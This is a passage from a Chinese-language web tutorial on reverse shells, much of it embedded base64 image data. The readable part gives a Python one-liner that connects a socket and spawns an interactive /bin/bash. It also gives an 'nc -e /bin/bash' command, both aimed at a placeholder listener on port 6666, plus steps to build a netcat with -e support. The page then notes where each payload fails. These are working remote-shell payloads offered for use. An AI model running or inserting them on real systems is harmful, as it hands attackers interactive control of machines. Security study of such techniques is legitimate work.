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" width="1080" height="92" class="img_ev3q"></p>
<p>**优点：**在大多数Liunx系统上都可以使用</p>
<p>**缺点：**在路由器系统中不存在bash，存在符号&gt;、&amp; 在反序列化中或者对符号转义的情况下就没有办法反弹了。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect</span><span class="token string variable punctuation" style="color:#393A34">((</span><span class="token string variable" style="color:#36acaa">&#x27;</span><span class="token string variable number" style="color:#36acaa">127.0</span><span class="token string variable number" style="color:#36acaa">.0</span><span class="token string variable number" style="color:#36acaa">.1</span><span class="token string variable" style="color:#36acaa">&#x27;</span><span class="token string variable punctuation" style="color:#393A34">,</span><span class="token string variable number" style="color:#36acaa">6666</span><span class="token string variable punctuation" style="color:#393A34">))</span><span class="token string" style="color:#e3116c">;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158236574740847872744-6488bb85703c024025f4d578fdb86009.jpg" width="1080" height="106" class="img_ev3q"></p>
<p>**优点：**在安装了python上的linux都可以使用，原理还是将标准输入、标准输出、标准错误输出重定向到远程。使用bash交互模式启动。</p>
<p>**缺点：**在路由器系统中不存在bash或者阉割了python库，存在符号&gt;、&amp; 、&#x27;、&quot;在反序列化中或者对符号转义的情况下就没有办法反弹了。单双引号也会导致闭合问题。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> /bin/bash </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1 </span><span class="token number" style="color:#36acaa">6666</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823657475288565542-c787fcf20beb3d92b8342da7e37ea851.jpg" width="934" height="115" class="img_ev3q"></p>
<p>一般Netcat有两个版本，一个版本是不提供反向连接的版本，一个是全功能版本。这两者的区别就是是否带-e参数，只有带-e参数的版本才支持反向连接。ubuntu 18.04安装的是不提供反向链接的版本。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-zxvf</span><span class="token plain"> netcat-0.7.1.tar.gz </span><span class="token parameter variable" style="color:#36acaa">-C</span><span class="token plain"> /usr/local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> netcat-0.7.1 netcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local/netcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./configure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="data:image/jpeg;base64,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